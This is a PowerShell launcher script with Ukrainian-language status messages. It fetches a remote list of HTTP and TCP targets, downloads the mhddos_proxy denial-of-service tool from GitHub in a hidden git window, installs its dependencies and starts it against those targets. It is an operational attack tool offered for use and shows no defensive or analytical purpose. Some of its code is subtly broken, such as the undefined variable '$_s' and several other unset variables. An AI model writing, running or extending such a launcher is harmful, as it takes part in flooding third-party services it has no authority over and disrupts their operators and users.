[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
Clear-Host
# Will be necessary for Windows 7 adaptation
If ($PSVersionTable.PSVersion.Major -lt 3) {
    $PsScriptRoot = Split-Path $MyInvocation.MyCommand.Path 
}
. $PsScriptRoot\functions.ps1

$LogoTxt = Get-Content -Path "$PsScriptRoot\Logo.txt"
$LogoSize = $LogoTxt.Length
for ($i=0; $i -lt $LogoSize; $i++ ) {
    $fgColor = $i -lt ( $LogoSize/2) ? "Blue" : "Yellow"
    Write-MidleHost $LogoTxt[$i] -ForegroundColor $fgColor -BackgroundColor 'Black'
}
Write-MidleHost "УКРАЇНСЬКИЙ ЖНЕЦЬ"
Write-MidleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Green'
Write-Host ""

# get targets
Write-MidleHost "Завантаження цілей" -NoNewline
$TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
$TargetsList = ( Download-String -SourceUrl $TargetsSrc ) -split "\n" | 
    Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') } |
    Foreach-Object {$_ -split " "} | Sort-Object -Unique

# create files with targets
$TargetFiles = 'xaa.uaripper.txt', 'xab.uaripper.txt', 'xac.uaripper.txt', 'xad.uaripper.txt'
$NumberOfTargetsFiles = $TargetFiles.Length
$NumberOfTargets = $TargetsList.Length

# little math to calculate number of entries in one file

$LnInFile = [int]($NumberOfTargets / $NumberOfTargetsFiles)

for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
    $s = $i * $LnInFile
    $e = ($i -ne $NumberOfTargetsFiles - 1) ? ($_s + $LnInFile - 1) : ($NumberOfTargets)
    # workaround to save targets without empty line in the end of file as Unix(LF)
    ($TargetsList[$s..$e] -join "`n").Trim() | Out-File "$RootPath\tmp\$($TargetFiles[$i])"
}

Write-MidleHost "Знайдено $NumberOfTargets цілей" -Here
$TargetsList = $null

Write-MidleHost "Завантаження mhddos_proxy" -NoNewline
$RemoteMhddosProxy = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
$StartParams = @{
    'FilePath' = "$RootPath\Git\cmd\git.exe"
    'Wait' = $true
    'WindowStyle' = 'Hidden'
}
if (Test-Path -Path $LocalMhddosProxy) {
    $StartParams.Add("ArgumentList", "-C $LocalMhddosProxy pull --quiet")
}
else {
    $StartParams.Add("ArgumentList", "clone $RemoteMhddosProxy $LocalMhddosProxy --quiet")
}
Start-Process @StartParams
Write-MidleHost "Завантажено останню версію mhddos_proxy з GitHub" -Here -NoNewline

Write-MidleHost "Створення і активація віртуального оточення" -Here -NoNewline
&"$PyPath\python.exe" -m virtualenv $VenvPath --quiet
#&"$VenvPath\Scripts\activate.ps1"

Write-MidleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
&"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet
Write-MidleHost "Запуск mhddos_proxy" -Here -NoNewline

$BackgroundJob = { 
    $StartParams = @{
        'FilePath' = "$PyPath\python.exe"
        'ArgumentList' = "$LocalMhddosProxy\runner.py -c $FilePath $threads $methods"
        'NoNewWindow' = $true
        'PassThru' = $true
        'Wait' = $true
    }
    Start-Process @StartParams
}